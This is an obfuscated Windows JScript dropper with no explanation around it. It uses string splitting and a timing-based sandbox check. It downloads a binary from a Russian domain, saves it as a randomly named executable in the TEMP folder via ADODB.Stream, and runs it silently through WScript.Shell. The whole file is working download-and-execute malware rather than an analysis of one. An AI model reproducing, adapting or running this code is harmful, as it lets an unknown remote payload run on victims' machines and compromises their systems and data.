var UZ = false;
var FX = "Create"+"Object";
var DK = function NI() {return WScript[FX]("WScript"+".Shell");}(), VJ = 11;
var RJ = "MSXML2"+".XMLHTTP";
var A = 2;
var TW = A - 2;
function B(JU){DK["Run"](JU, TW, TW);};
function L(){return RJ + "";};
function L0(OR, EZ){TW = TW * 1; return OR - EZ;};
function CG(){return FX;};
/*@cc_on
  @if (@_win32 || @_win64)
    UZ = true;
  @end
@*/
if (UZ)
{
var U = "";
function S(){return 22;};
var L1 = 0; var PT = 0;
function FT()
{
var CT = new this["Date"]();
var T = CT["getUTCMilliseconds"]();
WScript["Sleep"](S());
var CT = new this["Date"]();
var Z0 = CT["getUTCMilliseconds"]();
WScript["Sleep"](S());
var CT = new this["Date"]();
var XH = CT["getUTCMilliseconds"]();
var L1 = "R";
L1 = L0(Z0, T);
var PT = "JX";
PT = L0(XH, Z0);
U = "open";
return L0(L1, PT);
}
var Q = false;
var LS = false;
for (var G = TW; G < S() * 1; G++){if (FT() != TW){
Q = true; 
PT = "31" + 11 * L1 + PT; 
LS = true; 
break;
}}
function ES() {return ((Q == true) && (Q == LS)) ? 1 : TW;};
if (Q && ES() && LS){
function VB() {return DK["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "0NE0xWMBuGqXHmH.ex" + "e";};
 NS = L();
 V = WScript[FX](NS);
 var HE = 1;
do { 
	for (;HE;){
	try {
		if (HE == 1)
		{
			V[U]("GET", "http://zakaz-sharikov.ru/x9dslp", false);
			V["send"]();
			O = "Sleep";
			HE = 2;
		}
		WScript[O](S() + 120); 
		if (V["readystate"] < 2 * 2) continue;
		HE = TW;
		function Z(H0) {var TA = (1, 2, 3, 4, 5, H0); return TA;};
		FY = WScript[CG()]("ADODB.Stream");
		NS = FY;
		NS[U]();
		NS["type"] = Z(1);
		NS["write"](V["ResponseBody"]);
		FY["position"] = Z(TW);
		NS["Save" + "ToFile"](VB(), 2);
		FY["cl"+"ose"]();
		H = VB();
		B(H);
	} catch(W){};};
}while (HE);
}
}

